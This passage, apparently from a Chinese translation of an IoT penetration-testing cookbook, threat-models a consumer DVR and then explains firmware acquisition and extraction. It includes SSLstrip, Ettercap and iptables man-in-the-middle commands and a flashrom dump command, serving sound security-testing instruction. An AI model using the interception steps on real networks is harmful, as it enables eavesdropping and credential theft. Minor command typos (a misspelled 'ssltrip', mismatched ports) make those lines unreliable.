+   拦截网络通信

+   通过 SSH 访问文件系统资源

+   控制 DNS 以将流量重定向到受害者网络/计算机

+   访问 Web 配置和固件中可能的秘密

+   在 DVR 上安装恶意固件或应用程序

+   跟踪用户活动

+   篡改摄像头视频流和内容

+   篡改审计日志

+   变砖 DVR

+   阻止所有网络连接到 DVR

# 步骤 5 - 记录威胁

接下来，我们将挑选几个威胁案例，并记录它们的描述、威胁目标、攻击技术和可能存在的任何对策，以便评估它们的风险。

# 威胁＃1

| **威胁描述** | **攻击者可以在网络服务上执行远程代码执行** |
| --- | --- |
| 威胁目标 | DVR 固件。 |
| 攻击技术 | 攻击者发现 DVR API 通信中的漏洞。 |
| 对策 | DVR 在其 API 中设置了速率限制保护。 |

# 威胁＃2

| **威胁描述** | **攻击者可能获得对文件系统的管理员访问权并攻击局域网** |
| --- | --- |
| 威胁目标 | DVR 固件。 |
| 攻击技术 | 攻击者可以通过 SSH 或 Telnet 启用对控制台的访问。攻击者可以发现缓冲区溢出以访问文件系统内容并利用后期利用技术。攻击者发现 DVR 使用的库中的已知漏洞。 |
| 对策 | DVR 强制执行自动更新功能，防止启用易受攻击的库和服务。 |

# 威胁＃3

| **威胁描述** | **攻击者可能在 DVR 上安装恶意固件或应用程序** |
| --- | --- |
| 威胁目标 | DVR 固件。 |
| 攻击技术 | 攻击者可以在固件更新时加载恶意固件。 |
| 对策 | DVR 应该对其固件图像进行签名，并在重启时进行验证。 |

# 步骤 6 - 对威胁进行评级

就像我们在上一个步骤中所做的那样，我们需要使用 DREAD 对每个可能的威胁进行评分。使用以下表格，我们将选择一个威胁并找出其风险评级：

| **威胁风险评级：攻击者可能获得对文件系统的管理员访问权并攻击局域网** |  |
| --- | --- |
| **项目** | **得分** |
| 损害潜力 | 3 |
| 可重现性 | 2 |
| 利用性 | 2 |
| 受影响的用户 | 3 |
| 可发现性 | 2 |
| **风险评分：高** | **12** |

大多数嵌入式设备操作系统通常以 root 或管理员身份运行。这意味着通过设备固件可能被利用的任何漏洞都应该给您所需的最高访问权限。没有必要进行特权升级。更受监管的行业可能会推迟，但如果您正在测试消费者设备，固件很可能已经以 root 身份运行。

# 对物联网 Web 应用程序进行威胁建模

在为我们的 DVR 进行威胁建模练习时，我们将继续分解其 Web 应用程序。我们的 DVR 包含两种类型的 Web 应用程序。一个 Web 应用程序是嵌入式的，从 DVR 本身运行。第二个 Web 应用程序是供应商提供的用于远程访问 DVR 及其摄像头视频的 SaaS 应用程序。

SaaS 应用程序访问局域网中的嵌入式 DVR。我们对在 DVR 上本地运行的嵌入式 Web 应用程序有更清晰的了解，而对供应商 SaaS 应用程序了解较少。在本章的前面，我们提到了供应商 Web 应用程序使用的一些技术，但目前没有其他信息。我们将从绘制嵌入式 Web 应用程序的架构开始，并在威胁部分涉及供应商 SaaS 应用程序，而不是绘制其未知的架构。

# 如何做…

此时，我们应该对如何从头到尾进行威胁建模有一个很好的想法。考虑到这一点，我们将跳过威胁建模过程中的一些步骤，转向一些更重要的方面。

# 第 1 步：创建架构概述和分解

正如前面提到的，我们将绘制我们对嵌入式 Web 应用程序的了解，并致力于识别和评估其架构数据流中的威胁。以下图表说明了嵌入式 Web 应用程序的一些基本功能：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5367bbce-0460-4cd4-b5ca-d7a6e8b033be.png)

应用程序的流程很简单，因为流量只停留在局域网中，不会到达面向公众的流量。识别嵌入式应用程序的威胁不应该太困难。

# 第 2 步：识别威胁

由于嵌入式 Web 应用程序内的数据流具有简单性质，记录威胁应该很容易，尽管我们将添加一些额外的情景以考虑供应商 SaaS Web 应用程序。

攻击者可以利用 DVR 嵌入式 Web 应用程序和/或供应商 SaaS 应用程序来执行以下操作：

+   劫持用户会话以查看摄像头视频和配置

+   窃听 API 调用

+   通过命令注入漏洞执行操作系统命令

+   暴露敏感用户详细信息

+   通过 SQL 注入转储数据库内容

+   执行任意脚本

+   访问其他用户账户

+   伪造已登录用户账户下的请求（CSRF）

+   修改 DVR 设置以将流量重定向到未经授权的用户或网络

+   跟踪用户

+   暴露摄像头回放视频

+   删除摄像头回放视频

+   利用供应商环境的 Web 或应用程序服务器中的漏洞

+   防止合法用户访问

# 第 3 步：记录威胁

接下来，我们将选择类似于以前的案例的威胁案例，并记录它们的威胁案例描述、威胁目标、攻击技术和可能存在的任何对策，以评估它们各自的风险。

# 威胁＃1

| **威胁描述** | **攻击者可能通过命令注入漏洞执行操作系统命令** |
| --- | --- |
| 威胁目标 | 嵌入式和供应商 Web 应用程序。 |
| 攻击技术 | 攻击者发现 DVR 和供应商 API 通信中的漏洞，因为输入验证不严格。攻击者创建在应用程序上下文中运行的代码。攻击者通过将自定义代码注入应用程序来访问后端系统。 |
| 对策 | 应用程序执行输入验证和上下文输出编码。 |

# 威胁＃2

| **威胁描述** | **攻击者可能伪造已登录用户账户下的请求（CSRF）** |
| --- | --- |
| 威胁目标 | 嵌入式和供应商 Web 应用程序。 |
| 攻击技术 | 攻击者识别了一个易受攻击的 HTML 表单，并创建了代码来伪造已登录用户的请求更改。这些更改可能包括向第三方添加或共享用户账户。 |
| 对策 | 为改变应用程序状态的敏感 HTML 表单实施反 CSRF 令牌。 |

# 威胁＃3

| **威胁描述** | **攻击者可能通过 SQL 注入转储数据库内容** |
| --- | --- |
| 威胁目标 | 供应商 Web 应用程序。 |
| 攻击技术 | 攻击者将 SQL 命令附加或连接到用于查询数据库的易受攻击参数。 |
| 对策 | 应验证用户输入，并对查询进行参数化或使用存储过程来访问数据库。 |

# 步骤 4：评估威胁

使用以下表格，我们将选择一个威胁并找出其风险评级：

| **威胁风险评级：攻击者可能通过 SQL 注入转储数据库内容** |  |
| --- | --- |
| **项目** | **分数** |
| 损害潜力 | 3 |
| 可重现性 | 3 |
| 可利用性 | 2 |
| 受影响的用户：3 |
| 可发现性 | 2 |
| **风险评级分数：高** | **13** |

显然，利用供应商的 SaaS 应用程序中的漏洞会有更大的回报，因为有大量用户的详细信息和额外的功能可用。但是，重要的是要在法律范围内并获得授权后进行测试。针对嵌入式 Web 应用程序可能一开始并不会有太大的回报，但一旦对设备在线使用进行了调查并发现了可远程利用的漏洞，就肯定是可能的。

# 威胁建模 IoT 移动应用程序

在我们的下一个威胁建模练习中，我们将检查 DVR 系统的 IoT 移动应用程序。这个 DVR 系统（像许多其他 IoT 系统一样）由经销商和不同的 OEM 开发了几个可用的移动应用程序。为了演示目的，我们将只对一个 Android 和一个 iOS 应用程序进行威胁建模。

# 如何做…

由于我们已经从以前的配方中创建了大部分数据流图，我们将继续使用相同的 Microsoft 威胁建模工具进行此配方。

# 步骤 1：创建架构概述和分解

与我们上几个配方类似，我们将立即创建一个包含移动应用程序所有已知资产的数据流图。以下是移动应用程序的数据流图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0ba5ad59-60d4-49f0-96c6-4666befa3cb7.png)

我们可以看到应用程序每次都会联系第三方供应商的云环境，以查看帐户详细信息和摄像头回放。当用户与 DVR 处于同一网络时也会发生这种情况。远程访问 DVR 需要用户名和密码，这也存储在移动设备中。在这一点上，我们不知道在与供应商后端系统通信时如何存储或发送这些数据。这引出了我们的下一步，识别威胁。

# 步骤 2：识别威胁

攻击者可以利用移动应用程序执行以下操作：

+   窃听 API 调用

+   访问移动设备上的本地资源

+   暴露敏感用户详细信息

+   在移动设备上以明文查找所有用户的敏感信息

+   通过 SQL(ite)注入转储数据库内容

+   通过 WebView JavaScript 接口执行任意脚本

+   访问其他用户帐户

+   跟踪供应商云环境中的用户

+   暴露存储在设备上的摄像头回放

+   删除摄像头回放

+   更改用户信息

+   添加用户以共享摄像头而无需授权

+   创建不会过期的长期会话以持久访问

+   拍摄屏幕截图并发送给第三方

# 步骤 3：记录威胁

接下来，我们将选择与以前的配方类似的威胁案例，并对其进行评分。

# 威胁＃1

| **威胁描述** | **攻击者可能访问移动设备上的本地资源** |
| --- | --- |
| 威胁目标 | 移动应用程序。 |
| 攻击技术 | 攻击者发现 API 通信中的漏洞，从而使 WebView 暴露给 JavaScript 桥接以访问本地对象。攻击者利用 SQL 注入在移动设备上本地执行 SQLite 调用，以附加数据库并创建具有访问本地资源权限的文件。 |
| 对策 | 应用程序在 WebView 中禁用 JavaScript 或白名单接受脚本。应用程序验证用户输入并禁止执行动态查询。 |

# 威胁 #2

| **威胁描述** | **攻击者可能在移动设备上以明文形式找到所有用户的敏感信息** |
| --- | --- |
| 威胁目标 | 移动应用。 |
| 攻击技术 | 攻击者在运行时监视文件存储，并发现从供应商云同步到移动设备的数据，暴露了敏感信息。 |
| 对策 | 只应存储设备上所需的数据。 |

# 威胁 #3

| **威胁描述** | **攻击者可能未经授权添加用户共享摄像头** |
| --- | --- |
| 威胁目标 | 移动应用。 |
| 攻击技术 | 攻击者创建 CSRF 请求发送给受害者，自动添加用户进行共享。 |
| 对策 | 使用反 CSRF 令牌。 |

# 步骤 4：评估威胁

使用以下表格，我们将选择一个威胁并找出其风险评分：

| **威胁风险评估：攻击者可能访问移动设备上的本地资源** |
| --- |
| **项目** | **分数** |
| 损害潜力 | 3 |
| 可重现性 | 2 |
| 可利用性 | 1 |
| 受影响用户 | 1 |
| 可发现性 | 2 |
| **风险评分：中等** | **9** |

在移动领域，常见的威胁涉及数据及其存储和传输方式。因此，除非利用影响了大量用户或许多用户的数据被暴露，否则移动漏洞的风险相对较低。在应用程序测试期间，移动漏洞很少会导致服务器或移动设备上的 shell。

# 威胁建模物联网设备硬件

现在是时候分析我们目标 DVR 的硬件威胁了。大多数消费级 DVR 都很容易打开和拆解，以检查它们的各种输入以及外围设备。这是因为需要扩展存储空间，或者仅仅是因为它们不像生产**硬件安全模块**（HSM）那样设计成重型设备，后者具有防篡改保护措施。

# 如何做到...

在这个练习中，我们使用[`draw.io`](https://draw.io)图表来帮助我们展示硬件输入。

# 步骤 1：创建架构概述和分解

以下是 DVR 硬件的示意图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3e84dc12-c798-4bb5-9794-aedbeee14068.png)

根据图像描述，DVR 上有八个用于摄像头的 BNC 连接器，两个 USB 端口，一个以太网端口，一个电源端口，一个 VGA 和一个面向 DVR 外部的 HDMI 端口。DVR 内部有各种芯片，其中一个是 EEPROM，可能在 PCB 板上有 UART 的输入。

# 步骤 2：识别威胁

攻击者可以利用 DVR 硬件输入来执行以下操作：

+   通过 UART 访问控制台

+   在 EEPROM 中转储秘钥

+   利用 USB 堆栈中的漏洞到 DVR

+   连接恶意 USB 设备导致损坏

+   短接 DVR 电源输入

+   使 DVR 引导加载程序进入控制台访问

+   通过 USB 安装恶意软件

# 步骤 3：记录威胁

接下来，我们将挑选类似于之前的案例，并记录它们以评估各自的风险：

# 威胁 #1

| **威胁描述** | **攻击者可能通过 UART 访问控制台** |
| --- | --- |
| 威胁目标 | UART。 |
| 攻击技术 | 攻击设备的 PCB 板上的 UART 标头。 |
| 对策 | UART 访问受密码保护。UART 访问被另一芯片阻止。 |

# 威胁 #2

| **威胁描述** | **攻击者可能在 EEPROM 中转储秘钥** |
| --- | --- |
| 威胁目标 | EEPROM。 |
| 攻击技术 | 攻击者在 EEPROM 顶部附加 SOIC 夹子以读取其内容。 |
| 对策 | 防止在 EEPROM 中存储敏感数据。 |

# 威胁 #3

| **威胁描述** | **攻击者可能会使 DVR 引导加载程序进入控制台访问** |
| --- | --- |
| 威胁目标 | EEPROM。 |
| 攻击技术 | 攻击者中断引导加载程序的时间以访问控制台。 |
| 对策 | 实施故障保护或篡改保护。 |

# 步骤 4：评估威胁

使用以下表格，我们将选择一个威胁并找出其风险评级：

| **威胁风险评级：攻击者可能通过 UART 访问控制台** |
| --- |
| **项目** | **分数** |
| 损害潜力 | 3 |
| 可重现性 | 3 |
| 可利用性 | 2 |
| 受影响的用户 | 1 |
| 可发现性 | 2 |
| **风险评级分数：高** | **11** |

# 物联网无线电通信威胁建模

转向无线/无线通信，我们的 DVR 在无线通信方面并没有太多的活动，除了从客户端应用程序或摄像头传输到 DVR 的数据。大多数物联网设备和环境在不同频率上使用不同协议进行广播。幸运的是，我们只需要担心 Wi-Fi 和蜂窝供应商进入 DVR 的入口。

# 如何做…

对于我们的无线电通信威胁建模练习，我们可以简单地更新先前绘制的图表，以反映设备和应用程序内发生的无线电通信。

# 步骤 1：创建架构概述和分解

DVR 系统内无线通信使用的架构概述示例如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3fa2ea24-b3d1-4357-adf9-7caa0de6c52d.png)

正如您可能已经注意到的那样，无线通信仅限于用户通过客户端设备（如浏览器和应用程序）访问 DVR 以及可选的无线 IP 摄像头。还要注意的是，我们的图表已经迭代，因为通过先前的威胁模型已经获得了有关 DVR 的更多信息。

# 步骤 2：识别威胁

攻击者可以利用无线通信来做以下事情：

+   从长距离访问 DVR 网络

+   窃听 DVR 无线通信

+   干扰 DVR 通信

+   从 DVR 中移除 IP 摄像头

+   建立一个虚假接入点来连接摄像头

+   窃听手机通信

+   为**全球移动通信系统**（**GSM**）建立一个虚假基站

+   伪造客户端应用程序请求

+   添加虚假 IP 摄像头

+   通过恶意客户端应用程序访问 DVR 系统

# 步骤 3：记录威胁

接下来，我们将挑选类似于我们在以前的案例中所做的威胁，并记录它们以评估其各自的风险：

# 威胁＃1

| **威胁描述** | **攻击者可能从长距离访问 DVR 网络** |
| --- | --- |
| 威胁目标 | 无线。 |
| 攻击技术 | 攻击者利用中间人技术或窃取无线客户端的用户会话，从任何给定的客户端应用程序中利用无线通信。 |
| 对策 | 应实施授权设备并列入白名单。 |

# 威胁＃2

| **威胁描述** | **攻击者可能干扰 DVR 通信** |
| --- | --- |
| 威胁目标 | 无线。 |
| 攻击技术 | 攻击者识别从 IP 摄像头或客户端设备传输到 DVR 的流量，以便以 DVR 无法消耗的速率重放流量。 |
| 对策 | 应实施防干扰保护或在给定阈值内阻止恶意 IP 地址。 |

# 威胁＃3

| **威胁描述** | **攻击者可能添加虚假 IP 摄像头** |
| --- | --- |
| 威胁目标 | 无线。 |
| 攻击技术 | 攻击者模拟一个包含恶意固件的 IP 摄像头添加到网络中。 |
| 对策 | 应实施来自 DVR 的客户端验证。 |

# 步骤 4：评估威胁

使用以下表格，我们将选择一个威胁并找出其风险评级：

| **威胁风险评级：攻击者可能从长距离访问 DVR 网络** |
| --- |
| **项目** | **分数** |
| 损害潜力 | 3 |
| 可重现性 | 2 |
| 可利用性 | 3 |
| 受影响的用户 | 1 |
| 可发现性 | 3 |
| **风险评级分数：高** | **12** |

DVR 环境中的无线威胁可以使用常见的无线中间人技术，相当简单。其他威胁，如添加假 IP 摄像头，可能会更加困难，对于寻求更大影响的攻击者来说可能不值得。


# 第三章：分析和利用固件

在本章中，我们将涵盖以下内容：

+   定义固件分析方法

+   获取固件

+   分析固件

+   分析文件系统内容

+   模拟固件进行动态分析

+   开始使用 ARM 和 MIPS

+   利用 MIPS

# 介绍

到目前为止，我们已经介绍了物联网生态系统的基础知识，并通过威胁建模识别了其相应的风险，以帮助我们的测试。一些漏洞和威胁可能更容易通过对正在使用的技术进行侦察来识别。在本章中，我们将把精力完全集中在逆向工程固件上，以分析其内容以在运行时进行操纵。我们将讨论如何分解固件，如何分析固件内容，其架构，使用常见固件工具，以及如何修改固件以进行恶意用途。与其他软件逆向工程方法一样，分析固件绝对是一门艺术。您将了解到一些工具将帮助我们寻找常见的缺陷；然而，分析固件二进制镜像的安全性在很大程度上是一个手动过程。

在开始分析固件之前，重要的是讨论获取固件的一般方法以及哪些数据对我们来说是重要的。这一步可能已经在之前对固件进行轻量级威胁建模的过程中完成，但让我们从讨论固件分析的目标开始。

# 定义固件分析方法

固件是控制物联网设备的中心，这就是为什么我们可能希望在分析设备的其他部件之前先分析其内容。根据您的物联网设备所制造的行业，获取固件镜像并分解其内容可能是微不足道的。同样，一些行业领域需要特定的保障措施，这可能会使逆向工程变得更加困难和/或耗时。然而，在分析固件时，我们将寻找一些常见的模式。通常，评估者的最常见目标是定位以下内容：

+   密码

+   API 令牌

+   API 端点（URL）

+   易受攻击的服务

+   后门账户

+   配置文件

+   源代码

+   私钥

+   数据存储方式

在接下来的内容中，我们在分析固件时将有相同的目标。本篇将向您展示固件分析和逆向工程的概述方法。

以下是分析物联网固件的基本方法论列表：

1.  获取固件

1.  分析固件

1.  提取文件系统

1.  挂载文件系统

1.  分析文件系统内容

1.  模拟固件进行动态分析

# 获取固件

为了开始审查固件内容，我们首先必须获取固件二进制文件。本节将介绍获取给定目标的固件的各种技术。

# 准备工作

要获取固件，我们需要安装一些工具。我们将使用 Kali Linux，默认情况下已安装了大部分我们需要的工具。以下是您需要的工具：

+   **Kali Linux**：Kali Linux 可以通过他们的网站[`www.kali.org/downloads/`](https://www.kali.org/downloads/)下载。建议在使用 VMware 或 VirtualBox 时使用 Kali 虚拟镜像，可以在这里找到[`www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/`](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/)。

+   **Ettercap**：虽然 Kali Linux 默认安装了 Ettercap，但也可以通过[`ettercap.github.io/ettercap/downloads.html`](https://ettercap.github.io/ettercap/downloads.html)下载。

+   **Wireshark**：Wireshark 默认包含在 Kali Linux 中，也可以在[`www.wireshark.org`](http://www.wireshark.org)下载。

+   **SSLstrip**：SSLstrip 默认包含在 Kali Linux 中，也可以通过[`github.com/moxie0/sslstrip`](https://github.com/moxie0/sslstrip)下载。

+   **Flashrom**：Flashrom 默认情况下不包含在 Kali Linux 中，但我们可以使用以下命令轻松安装该工具：

```
apt-get install flashrom  
```

另外，可以通过[`www.flashrom.org/Downloads`](https://www.flashrom.org/Downloads)下载 flashrom。

# 如何做...

有几种方法可以从物联网设备获取固件。我们将在本教程中介绍大多数方法。固件图像可以通过以下方法获取：

+   从供应商的网站下载

+   在设备更新期间代理或镜像流量

+   直接从设备中转储固件

+   谷歌/研究

+   反编译相关移动应用程序

# 从供应商的网站下载

获取固件的最简单方法是通过供应商的网站。

以下截图演示了如何从供应商网站获取固件图像：

1.  导航到目标供应商的网站。

1.  在搜索栏中输入目标设备：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e8a1430a-7e62-47b7-a30b-9d64f284e2e0.png)

1.  选择“支持”选项卡：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a9b1b1f4-23c2-4e87-998e-3263c68bcdd9.png)

1.  选择“驱动程序和工具”按钮：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/41c21cf6-3d0f-46d2-b3e7-71c04db66105.png)

1.  单击下载链接：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6a9845e4-2f91-4372-94a7-eec51b7943ee.png)

1.  或者，您可以选择复制链接地址，通过`wget`在测试机器上下载文件（`wget <http://URL.com>`）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6a7ed2cc-206e-4bc7-a1a7-a768cd7ef365.png)

# 在设备更新期间代理或镜像流量

有时，通过供应商的网站获取固件可能不是一个选择，您将不得不执行步骤 2，在设备更新期间代理流量，或步骤 3，直接从设备中转储固件。为了在设备更新期间代理流量，您必须是**中间人**（**MITM**）或在更新功能期间镜像设备流量。另外，也可以代理 Web 或移动应用程序，以便获取固件下载的 URL。

您可能还需要调整用户代理标头，因为供应商已知会验证固件下载的这个值。以下是在 Kali Linux、Ettercap、Wireshark 和 SSLstrip 上执行设备 MITM 的基本步骤：

有几种方法和工具可以用于 MITM 流量到目标设备和从目标设备。下面的示例只是一种捕获设备流量的方法。

1.  启用 IP 转发：

```
echo 1 > /proc/sys/net/ipv4/ip_forward

```

1.  配置`iptables`将目标端口`80`的流量重定向到 SSLstrip 监听的端口`1000`：

```
iptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000

```

1.  启动 SSLstrip：

```
ssltrip -a

```

1.  启动 Ettercap GUI：

```
ettercap -G

```

1.  以下图显示了我们当前的步骤：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a034a581-0b20-4757-9824-da8e98af6627.png)

1.  单击“嗅探”菜单和“统一嗅探...”选项：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/2295f7bb-cae1-4183-9d73-3def839532ee.png)

1.  选择接口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0ffb4360-b7b8-42f8-832b-2ac0de78881d.png)

1.  选择扫描主机：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/91334e90-83ed-4478-8014-1e2c80c38cfc.png)

1.  打开 Wireshark 查看流量：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/487ff5b0-8f22-4b5f-b5b4-180f64ec9a53.png)

1.  通过单击“开始捕获数据包”来从目标设备捕获流量：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/52da8dfb-c021-4fc6-b4d6-4e9c40c5e0eb.png)

1.  根据需要过滤流量；在本例中，`192.168.1.137`是目标设备：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f6338392-0cc3-45b8-a202-718f5e13ccc8.png)

# 直接从设备中转储固件

如果我们无法通过供应商网站或代理其流量获取固件，我们可以开始通过 UART、SPI 或 JTAG 转储设备固件。直接转储固件需要访问设备并拆卸设备以找到其闪存存储器。一旦找到闪存存储芯片，您可以直接连接您的 UART 引脚，或者使用 8 引脚 SOIC 芯片夹通过 flashrom 和 SPI 启用的硬件板（如 Shikra）转储固件。以下是 SOIC 夹和 Shikra 如何连接到设备的方法：

>![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/2da9bdbd-c7ca-41fb-85d3-399a2e8e2ecf.png)

图片来源：[`www.xipiter.com/uploads/2/4/4/8/24485815/9936671_orig.jpg?562`](http://www.xipiter.com/uploads/2/4/4/8/24485815/9936671_orig.jpg?562)

用于将固件内容转储到 bin 文件的命令如下：

```
$ flashrom -p ft2232_spi:type=232H -r spidump.bin 

```

如果我们使用 flashrom 或之前描述的任何方法获取了设备的固件，现在我们需要分析固件二进制文件。

# 谷歌搜索

如果由于某种原因我们无法通过之前列出的方法获取固件映像，我们的最后选择是求助于谷歌。如果我们想依赖他人的工作或检查我们的设备是否被研究过，这可能不是我们的最后选择。还有可能是当前或前员工可能已经将固件文件上传到他们的个人存储库或 Web 服务器。无论如何，我们可以使用谷歌搜索技术来缩小我们对给定目标设备的搜索范围。我们还可以利用谷歌黑客数据库来搜索固件或设备，网址为[`www.exploit-db.com/google-hacking-database`](https://www.exploit-db.com/google-hacking-database)。

# 工作原理...

在这个教程中，我们通过从供应商的网站获取固件映像以及设置 MITM 测试平台来捕获设备流量，直接从设备中转储固件以及作为最后手段进行谷歌搜索。在这里，我将解释为什么我们要通过这些方法获取固件。

当从供应商那里下载固件文件时，您通常可以通过他们的支持网站、文件共享或社区论坛找到所需的内容。有时供应商会要求输入密码才能下载文件，或者将固件密码保护在 ZIP 文件中。如果是这种情况，出于时间考虑，我们很可能会直接跳过获取固件的下一步。

接下来，我们将介绍如何使用 Kali Linux、SSLstrip、Ettercap 和 Wireshark 设置 MITM 测试平台，以捕获设备更新期间的设备流量。

# 分析固件

一旦我们拥有了固件，现在的主要步骤是分析固件。这涉及查看固件内部并尝试识别尽可能多的安全问题，这就是我们将在本节中进行的工作。

# 准备工作

在这一部分，我们将了解一旦获得固件二进制包，如何分析固件。我们可以使用几种不同的技术来查看固件并识别其中的安全问题，我们将在本节中介绍如何入门并识别一些常见的安全问题。

如前所述，固件对于渗透测试人员来说包含许多有趣的东西，包括 API 密钥、私人证书、硬编码凭据、后门等。

# 操作步骤...

为了分析固件，我们必须对其进行逆向工程，以查看其内部组件。固件的内部组件涉及引导加载程序、内核、文件系统和其他资源等内容。在这些内容中，我们最感兴趣的是文件系统，因为这将为我们保存所有的秘密。显然，你可以玩弄引导加载程序并查看它所保存的内容，或者修改它并创建新的固件（我们将在接下来的部分讨论），但在这个时候，我们只关心如何对固件进行逆向工程并从中提取文件系统。

固件，正如我们所知，是一个二进制文件包，文件系统只是可以存储在二进制文件中特定偏移量处并具有特定大小的组件之一。但是，此时我们尚不知道固件内部文件系统的任何信息，包括偏移量和大小。要找出这些信息，我们需要使用诸如`hexdump`和`grep`之类的工具来查找我们正在寻找的各种内容的签名。以下是 Squashfs 文件系统的示例：

1.  如果我们想要查找 Squashfs 文件系统，我们可以在逆序中使用`hexdump`输出来`grep` `shsq`（这是任何 Squashfs 文件系统的魔术字节）如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/a691594b-1525-4a6e-8ee1-9f123fe6f293.png)

1.  如您所见，我们能够确定 Squashfs 文件系统从地址`0x000e20c0`开始。一旦我们获得了这些信息，我们就可以使用`dd`实用程序从此位置开始转储内容直到结束，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/22a1830b-2db7-4e45-a0b2-173203883026.png)

1.  一旦我们从固件二进制文件中切割出 Squashfs 内容，我们就可以简单地运行诸如`unsquashfs`之类的实用程序来查看整个文件系统。

让我们继续运行`unsquashfs`，看看我们是否可以查看整个文件系统：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/231b08e9-cd93-4731-b035-9215369f9e13.png)

1.  从上面的屏幕截图中可以看出，我们能够提取 Squashfs 文件系统映像。请忽略上图中的警告和错误，因为它只是在抱怨我们没有以 root 用户身份运行命令。一旦我们提取了它，我们就可以转到各个目录并查看各个文件，以识别漏洞。以下是整个文件系统的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/9f5d8de3-ba20-43e7-82a6-4fe6735ac1e3.png)

这就是我们如何反向工程固件并从固件二进制映像中提取文件系统。我们还可以使用 Binwalk 等工具自动执行前面提到的所有步骤。由*Craig Heffner*编写，它允许我们仅使用一个命令从固件二进制映像中提取文件系统。

1.  要安装 Binwalk，只需克隆位于[`github.com/devttys0/binwalk.git`](https://github.com/devttys0/binwalk.git)的 Binwalk 的 GitHub 存储库，如下所示：

```
git clone https://github.com/devttys0/binwalk.git

```

1.  运行`./deps.sh`以安装所有必需的依赖项和二进制文件。

1.  安装 Binwalk 成功后，您可以通过简单输入`binwalk`并按*Enter*来确认。这应该显示 Binwalk 的帮助菜单：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/3664de5c-7156-4dd7-bf4d-940aa37bf7d3.png)

1.  让我们继续使用 Binwalk 从相同的固件中执行文件系统提取。为此，我们将使用`-e`标志进行提取：

```
binwalk -e [firmware-name]

```

1.  这将向我们展示固件中存在的各个部分，并为我们提取内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0dd734fb-9074-4629-b4e5-1073c269d496.png)

1.  `t`和`vv`标志只是允许我们以更易读和详细的格式打印输出。Binwalk 执行后，我们可以转到名为`_[firmwarename].extracted`的目录，其中将保存整个文件系统，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f854a40f-4dd9-49e5-a998-392ab5701b61.png)

这就是我们如何从固件二进制文件中手动和自动提取文件系统。

# 工作原理...

在这种情况下，文件系统提取使用了我们之前执行的相同方法。它使用魔术字节和头部签名字符（例如 Squashfs 的`sqsh`等）来检测文件系统和其他组件的偏移量。Binwalk 检测到的文件系统数量可以在此 URL 找到：[`github.com/devttys0/binwalk/blob/62e9caa164305a18d7d1f037ab27d14ac933d3cf/src/binwalk/magic/filesystems`](https://github.com/devttys0/binwalk/blob/62e9caa164305a18d7d1f037ab27d14ac933d3cf/src/binwalk/magic/filesystems)。

您还可以手动向 Binwalk 实例添加更多签名并编译它以检测这些额外的文件系统。

# 还有更多...

您还可以使用 Binwalk 执行许多其他操作，例如检测给定固件映像的熵。这可以帮助您确定固件映像是否被压缩或加密。为了执行熵分析，请像下面的截图中所示，使用带有`-E`标志的`binwalk`，后跟固件名称：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/7932f99a-c60d-49cd-abd1-106af4aa45ef.png)

正如您在前面的截图中所看到的，这个特定的固件似乎没有加密，因为在加密固件映像中会找到的大量变化缺失。

# 另请参阅

+   有关固件分析和逆向工程的其他信息，Binwalk 的作者*Craig Heffner*的博客非常有用。它还将帮助您了解不同的固件映像是如何变化和易受攻击的。该博客位于[`www.devttys0.com/`](http://www.devttys0.com/)。

# 分析文件系统内容

现在我们知道如何对固件进行逆向工程并从中提取文件系统，本节中我们将查看文件系统内容，并对其进行额外的漏洞分析。这将帮助我们更深入地了解如何在固件映像中找到安全问题，借此我们将能够破坏物联网设备。

# 准备工作

有两种分析文件系统内容的方法：

+   手动分析。

+   自动化工具和脚本。

# 手动分析

在固件文件系统内容中寻找漏洞的方法中，我们对文件系统中存在的各种文件和文件夹进行分析。这可能涉及查看配置文件、web 目录、密码文件、寻找后门等。这是发现给定固件中漏洞的理想方式，也是我们本节的重点。

# 自动化工具和脚本

在撰写本书的日期之前，除了一些脚本外，没有一个完整的套件框架或工具可以帮助我们发现固件中的漏洞。因此，如果您熟悉 Web 应用程序安全或网络安全，就没有类似于 Arachni、w3af、Metasploit 或类似工具。

# 如何操作...

